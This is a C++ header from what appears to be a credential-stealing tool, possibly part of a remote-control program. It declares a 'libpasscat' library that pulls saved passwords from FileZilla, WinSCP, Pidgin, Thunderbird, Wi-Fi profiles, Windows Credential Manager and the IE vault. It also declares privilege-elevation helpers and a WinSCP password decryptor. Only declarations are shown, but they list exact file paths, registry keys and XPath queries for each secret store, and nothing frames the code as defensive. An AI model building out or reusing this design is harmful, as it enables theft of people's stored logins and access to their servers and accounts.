
#pragma once

#include "Probe.h"
#include <Windows.h>
#include <string>
#include <tchar.h>
#import <msxml6.dll>rename_namespace(_T("MSXML"))
#include <iostream>
#include <wincred.h>
#include <ShlObj.h>
#include <TlHelp32.h>
#include <wincrypt.h>

using namespace Server;


#define FILEZILLA_FILE_ONE L"recentservers.xml"
#define FILEZILLA_FILE_TWO L"sitemanager.xml"
#define FILEZILLA_XPATH_ONE L"//FileZilla3/RecentServers/Server"
#define FILEZILLA_XPATH_TWO L"//FileZilla3/Servers/Server"
#define FILEZILLA_FOLDER L"\\FileZilla"

#define WIFI_XPATH_ONE L"//pf:WLANProfile/pf:MSM/pf:security/pf:authEncryption"
#define WIFI_XPATH_TWO L"//pf:WLANProfile/pf:MSM/pf:security/pf:sharedKey"

#define WINSCP_REG_ONE L"Software\\Martin Prikryl\\WinSCP 2\\Configuration"
#define WINSCP_REG_TWO L"Software\\Martin Prikryl\\WinSCP 2\\Sessions"

#define PIDGIN_FILE L"accounts.xml"
#define PIDGIN_XPATH L"//account/account"
#define PIDGIN_FOLDER L"\\.purple"


#define THUNDERBIRD_FILE L"logins.json"
#define THUNDERBIRD_FOLDER L"\\Thunderbird\\Profiles"
#define THUNDERBIRD_DLL_NSS3 L"C:\\Program Files (x86)\\Mozilla Thunderbird\\nss3.dll"
#define THUNDERBIRD_DLL_MOZGLUE L"C:\\Program Files (x86)\\Mozilla Thunderbird\\mozglue.dll"


namespace libpasscat {
	extern bool initialized;
	void init(void);
	void cat_filezilla_passwords(void);
	void cat_wifi_passwords(void);
	void cat_winscp_passwords(void);
	void cat_pidgin_passwords(void);
	void cat_credmanager_passwords(void);
	void cat_vault_ie_passwords(void);
	void finalize(void);
}

namespace libfilezilla {

	void print_filezilla_passwords(void);
}



namespace libpriv {
	BOOL IsElevated(void);
	BOOL SetCurrentPrivilege(LPCTSTR pszPrivilege, BOOL bEnablePrivilege);
}

namespace libvaultie {
	extern bool initialized;
	extern HMODULE hvaultLib;
	void init(void);
	void finalize(void);
	void print_vault_ie_passwords(void);
}



namespace libwinscp {
	std::string decrypt_password(const char* username, const char* hostname, const char* hash);
}


namespace libxml {
	extern bool initialized;
	void init(void);
	void dump_xml_content(std::wstring filename);
	MSXML::IXMLDOMNodeListPtr select_by_path(std::wstring filename, std::wstring XPATH);
	MSXML::IXMLDOMNodeListPtr select_by_path(LPWSTR data, std::wstring XPATH);
	void finalize(void);
}


namespace libsystem {
	HRESULT get_appdata_path(PWSTR* path);
	HRESULT get_localappdata_path(PWSTR* path);
	std::wstring get_filezilla_path(void);
	std::wstring get_pidgin_path(void);
	DWORD ProcessId(LPCSTR ProcessName);
}